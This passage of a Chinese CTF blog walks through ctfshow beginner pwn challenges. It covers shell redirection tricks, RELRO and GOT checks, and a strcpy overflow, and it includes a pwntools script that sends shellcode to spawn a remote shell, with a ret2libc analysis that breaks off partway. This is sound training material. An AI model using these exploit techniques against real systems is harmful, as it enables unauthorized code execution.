<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">fake</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo 'flag is here'>>/ctfshow_flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>再双击查看<code>real()</code>函数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">real</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo 'flag is here'>/ctfshow_flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以发现两个函数的执行语句差不多，区别在<code>fake()</code>函数是<code>&gt;&gt;</code>而<code>real()</code>函数只有<code>&gt;</code></p>
<h4 id="echo-输出重定向符号"><a href="#echo-输出重定向符号" class="headerlink" title="echo+输出重定向符号"></a>echo+输出重定向符号</h4><ol>
<li><code>echo &gt; file</code>：将文本内容写入文件，如果文件不存在则创建文件。如果文件已经存在，则会覆盖文件中的内容。</li>
<li><code>echo &gt;&gt; file</code>：将文本内容追加到文件末尾。如果文件不存在，则创建一个新文件并将文本内容写入其中。</li>
</ol>
<p>所以我们要选择执行的函数是<code>fake()</code>，因为是在末尾追加<code>flag is here</code>语句</p>
<p>而<code>real()</code>函数将会把整个ctfshow_flag文件的内容修改为<code>flag is here</code></p>
<p>那么nc连上靶机，输入9即可获取flag</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230622202238196.png" alt="image-20230622202238196"></p>
<hr>
<h3 id="pwn19"><a href="#pwn19" class="headerlink" title="pwn19"></a>pwn19</h3><blockquote>
<p>&gt;&amp;0定向到输入流</p>
</blockquote>
<p>下载题目附件pwn</p>
<p>和上题一样在虚拟机中给执行权限，checksec查看信息，发现一样是64位</p>
<p>丢到ida64进行反编译</p>
<p>前面的部分和上题一样，直接看关键部分</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>		<span class="token comment">// fork()函数用于在进程中创建一个新的子进程，则一开始返回的一定是0,先进入else语句</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">wait</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag is not here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"give you a shell! now you need to get flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fclose</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">system</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>fclose()</code>函数关闭一个文件流，这里关闭了_bss_start流，也即关闭了这里的输出流，我们执行命令得不到回显</p>
<h4 id="gt-amp-0"><a href="#gt-amp-0" class="headerlink" title="&gt;&amp;0"></a>&gt;&amp;0</h4><blockquote>
<p>一种Shell重定向语法，用于将标准输出(1)重定向到标准输入(0)</p>
</blockquote>
<p>通过在末尾添加<code>&gt;&amp;0</code>可以实现绕过关闭输出流的限制</p>
<p>所以nc连上靶机开做(这里执行命令的环境不是交互式的，每执行一个命令就要重新连一次靶机)</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token operator">></span><span class="token file-descriptor important">&amp;0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230622211142572.png" alt="image-20230622211142572"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> ctfshow_flag <span class="token operator">></span><span class="token file-descriptor important">&amp;0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230622211205672.png" alt="image-20230622211205672"></p>
<hr>
<h2 id="plt与got"><a href="#plt与got" class="headerlink" title="plt与got"></a>plt与got</h2><p>基础知识可以看我专门写的另一篇博客<a href="">Linux动态链接中的PLT和GOT</a></p>
<p>这里专门就获取题目的flag进行学习</p>
<h3 id="pwn20"><a href="#pwn20" class="headerlink" title="pwn20"></a>pwn20</h3><blockquote>
<p>提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}</p>
</blockquote>
<blockquote>
<p>例如 .got可写.got.plt表可写其地址为0x400820 0x8208820 最终flag为ctfshow{1_1_0x400820_0x8208820} 若某个表不存在，则无需写其对应地址 如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}</p>
</blockquote>
<h4 id="got表与-got-plt是否可写"><a href="#got表与-got-plt是否可写" class="headerlink" title=".got表与.got.plt是否可写"></a>.got表与.got.plt是否可写</h4><p>这里与linux可执行文件的保护机制相关，就是我们使用<code>checksec</code>时查看到的信息相关，包括Stack canaries、No-eXecute、ASLR和PIE、FORTIFY_SOURCE以及RELRO</p>
<p>与.got、.got.plt节是否可写有关的是<strong>RELRO保护机制</strong></p>
<h5 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h5><blockquote>
<p>是一种二进制文件的保护机制，它可以防止攻击者利用程序中的全局偏移表（GOT）进行攻击。在 RELRO 保护下，GOT 表被设置为只读，从而使攻击者无法修改 GOT 表中的地址。</p>
</blockquote>
<p>RELRO 机制有两种不同的实现方式：<code>Partial RELRO</code> 和<code> Full RELRO</code>。</p>
<p><code>Partial RELRO</code> ：只在程序启动时保护 GOT 表的前部分，即只有在动态链接库被加载时才会保护 GOT 表的后部分。这种保护方式可以防止一些简单的攻击，但无法防止攻击者修改 GOT 表中的地址。</p>
<p>即表示<code>.got不可写而.got.plt可写</code></p>
<p><code>Full RELRO</code> ：在程序启动时即可完全保护 GOT 表，即使在动态链接库被加载后也不允许修改 GOT 表中的地址。这种保护方式可以有效地防止攻击者利用 GOT 表进行攻击。</p>
<p>即表示<code>.got不可写.got.plt也不可写</code></p>
<p>所以下载题目附件pwn，丢入虚拟机checksec查看保护机制</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230623213844332.png" alt="image-20230623213844332"></p>
<p>可以看到<code>No RELRO</code>，也就表示.got与.got.plt都可写，即flag的前一部分为<code>1_1</code></p>
<p>于是使用<code>readelf -S</code>命令查看 ELF 文件的所有节信息，包括每个节的名称、大小、偏移量和属性，这里其中就包含了节的所在地址</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230623214655613.png" alt="image-20230623214655613"></p>
<p>找到.got和.got.plt的地址</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230623214803663.png" alt="image-20230623214803663"></p>
<p>地址就是跟在PROGBITS后的第一段信息，即<code>0x600f18</code>和<code>0x600f28</code></p>
<p>则flag：<code>ctfshow&#123;1_1_0x600f18_0x600f28&#125;</code></p>
<hr>
<h3 id="pwn21"><a href="#pwn21" class="headerlink" title="pwn21"></a>pwn21</h3><blockquote>
<p>和上一题一样要提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}</p>
</blockquote>
<p>下载题目附件pwn，丢进虚拟机</p>
<p><code>checksec</code>检查保护</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230623215439795.png" alt="image-20230623215439795"></p>
<p>可以看到这里是<code>Partial RELRO</code>，表示.got不可写而.got.plt可写，即flag的前一部分为<code>0_1</code></p>
<p>然后<code>readelf -S</code>查看节信息找到.got和.got.plt的地址</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230623215800804.png" alt="image-20230623215800804"></p>
<p>即后一部分的flag为<code>0x600ff0_0x601000</code></p>
<p>所以flag：<code>ctfshow&#123;0_1_0x600ff0_0x601000&#125;</code></p>
<hr>
<h3 id="pwn22"><a href="#pwn22" class="headerlink" title="pwn22"></a>pwn22</h3><p>问题和上一题一样</p>
<p>下载题目附件pwn，丢进虚拟机</p>
<p><code>checksec</code>检查保护</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230623220150273.png" alt="image-20230623220150273"></p>
<p>可以看到这里是<code>Full RELRO</code>，表示.got不可写.got.plt也不可写，即flag的前一部分为<code>0_0</code></p>
<p>然后<code>readelf -S</code>查看节信息找到.got和.got.plt的地址</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230623220307852.png" alt="image-20230623220307852"></p>
<p>这里只找到了.got，则flag后一部分为<code>0x600fc0</code></p>
<p>flag：<code>ctfshow&#123;0_0_0x600fc0&#125;</code></p>
<hr>
<h2 id="ret2shellcode、ret2libc"><a href="#ret2shellcode、ret2libc" class="headerlink" title="ret2shellcode、ret2libc"></a>ret2shellcode、ret2libc</h2><p>相关知识请移步<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2libc">ctfwiki</a></p>
<p>等哪天有空了说不定会补上（x</p>
<h3 id="pwn23"><a href="#pwn23" class="headerlink" title="pwn23"></a>pwn23</h3><blockquote>
<p>缓冲区溢出</p>
</blockquote>
<p>下载题目附件pwn，丢进虚拟机checksec</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230624215623900.png" alt="image-20230624215623900"></p>
<p>是32位的，丢进ida反编译</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __gid_t v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp-Ch] [ebp-2Ch]</span>
  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp-8h] [ebp-28h]</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp-4h] [ebp-24h]</span>
  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [esp+4h] [ebp-1Ch]</span>

  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/ctfshow_flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">// 打开名为 /ctfshow_flag 的文件</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>stream <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"/ctfshow_flag: No such file or directory."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">// 从 /ctfshow_flag 文件中读取不超过 64 个字符的内容到缓冲区 flag 中</span>
  <span class="token function">signal</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__sighandler_t<span class="token punctuation">)</span>sigsegv_handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setresgid</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v6<span class="token punctuation">,</span> v7<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048940<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_80489B4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048A30<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048ABC<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048B4C<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048BD0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048C64<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>aClassifyCtfsho<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Linux_Security_Mechanisms                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : No canary found                                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How to input ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> argc <span class="token operator">></span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 如果命令行参数个数大于 1，则调用名为 ctfshow() 的函数并将第二个命令行参数（argv[1]）作为参数传递给它</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ctfshow()函数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>__cdecl <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> dest<span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+Ah] [ebp-3Eh] BYREF</span>

  <span class="token keyword">return</span> <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>审计代码得知，</p>
<p>主要部分：虽然读取了flag文件保存在缓冲区中但是没有输出，同时判断我们输入的参数是否大于1，如果大于1进入ctfshow()函数并且将我们输入的第一个参数作为ctfshow()函数的参数，ctfshow函数接收一个src参数将其值赋给dest</p>
<p>而ctfshow()函数用到了<code>strcpy()</code>函数，这个函数是可以发生溢出的，src是我们输入的参数，并且没有被限制长度，代表我们可以利用缓冲区溢出漏洞</p>
<p>那么ssh连上靶机</p>
<p>可以发现不能直接<code>cat /ctfshow_flag</code></p>
<p>而这里的pwnme应该是我们下载的附件，所以我们还是要靠这个文件来获取flag</p>
<p>既然我们的思路是缓冲区溢出，那就在运行该文件传参的时候输入大量的字符串使其溢出即可</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230624221634953.png" alt="image-20230624221634953"></p>
<p>成功获取flag</p>
<hr>
<h3 id="pwn24"><a href="#pwn24" class="headerlink" title="pwn24"></a>pwn24</h3><blockquote>
<p>shellcraft</p>
</blockquote>
<p>下载题目附件pwn，丢进虚拟机checksec</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230624222936319.png" alt="image-20230624222936319"></p>
<p>是32位的，丢进ida反编译</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_80486E0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048754<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_80487D0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_804885C<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_80488EC<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048970<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048A04<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>aClassifyCtfsho<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Linux_Security_Mechanisms                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : NX disabled &amp; Has RWX segments                          "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argc<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然而ctfshow()函数没反编译出来，那就看看其汇编代码凑合了</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:080484C6                               ; int __cdecl ctfshow(_DWORD)
.text:080484C6                               public ctfshow
.text:080484C6                               ctfshow proc near                       ; CODE XREF: main+132↓p
.text:080484C6
.text:080484C6                               buf&#x3D; byte ptr -88h		; 定义buf
.text:080484C6                               var_4&#x3D; dword ptr -4
.text:080484C6
.text:080484C6                               ; __unwind &#123;
.text:080484C6 55                            push    ebp
.text:080484C7 89 E5                         mov     ebp, esp
.text:080484C9 53                            push    ebx
.text:080484CA 81 EC 84 00 00 00             sub     esp, 84h
.text:080484D0 E8 2B FF FF FF                call    __x86_get_pc_thunk_bx
.text:080484D0
.text:080484D5 81 C3 2B 1B 00 00             add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)
.text:080484DB 83 EC 04                      sub     esp, 4
.text:080484DE 68 00 01 00 00                push    100h                            ; nbytes
.text:080484E3 8D 85 78 FF FF FF             lea     eax, [ebp+buf]		; ebp+buf&#x3D;ebp-0w88
.text:080484E9 50                            push    eax                             ; buf
.text:080484EA 6A 00                         push    0                               ; fd
.text:080484EC E8 6F FE FF FF                call    _read	; 调用read函数，将我们的输入赋给eax里的地址单元&#x3D;ebp-0x88
.text:080484EC
.text:080484F1 83 C4 10                      add     esp, 10h
.text:080484F4 83 EC 0C                      sub     esp, 0Ch
.text:080484F7 8D 85 78 FF FF FF             lea     eax, [ebp+buf]
.text:080484FD 50                            push    eax                             ; s
.text:080484FE E8 6D FE FF FF                call    _puts	; 调用puts函数，将eax地址单元的内容输出，此时eax&#x3D;ebp-0x88
.text:080484FE
.text:08048503 83 C4 10                      add     esp, 10h
.text:08048506 8D 85 78 FF FF FF             lea     eax, [ebp+buf]
.text:0804850C FF D0                         call    eax	; 调用eax里地址单元所指向的代码，eax的地址单元为ebp-0x88
.text:0804850C
.text:0804850E 90                            nop
.text:0804850F 8B 5D FC                      mov     ebx, [ebp+var_4]
.text:08048512 C9                            leave
.text:08048513 C3                            retn
.text:08048513                               ; &#125; &#x2F;&#x2F; starts at 80484C6
.text:08048513
.text:08048513                               ctfshow endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同时我们发现这里关掉了NX保护</p>
<h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><blockquote>
<p>用于防止程序运行时的内存攻击，如缓冲区溢出和代码注入等攻击</p>
</blockquote>
<p>关掉NX代表着栈可执行</p>
<p>而开始我们将栈中地址ebp-0x88赋给eax，并在该地址里写入我们输入的东西，最后程序会执行这里边的东西，也就是会执行我们写入的东西，如果我们写入的是shellcode，那么程序也就会执行我们的shellcode</p>
<p>题目描述中提示我们使用<code>shellcraft</code>模块进行攻击</p>
<p>那我们就开始编写exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># 与目标服务器的pwn文件建立进程</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span> <span class="token string">"28193"</span><span class="token punctuation">)</span> 

<span class="token comment"># 使用shellcraft模块生成shellcode</span>
shell <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token comment"># 向远程发送数据（我们的shellcode）</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>
<span class="token comment"># 建立交互式对话</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>连上后获取flag</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230624225136038.png" alt="image-20230624225136038"></p>
<hr>
<h3 id="pwn25"><a href="#pwn25" class="headerlink" title="pwn25"></a>pwn25</h3><blockquote>
<p>ret2libc</p>
</blockquote>
<p>下载题目附件pwn，丢进虚拟机checksec</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230625210740882.png" alt="image-20230625210740882"></p>
<p>开了NX，是32位，题目描述让我们用ret2libc来做</p>
<p>丢进ida反编译</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argc<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">logo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Hello CTFshow!\n"</span><span class="token punctuation">,</span> <span class="token number">0xEu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ctfshow()函数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-88h] BYREF</span>

  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>审计代码，先通过ctfshow()函数，读入我们输入的字符串</p>
<p>注意这里读入的buf是132个长度，而read()函数限制我们读入的长度位0x100，也就是256个长度</p>
<p>说明会缓冲区溢出</p>
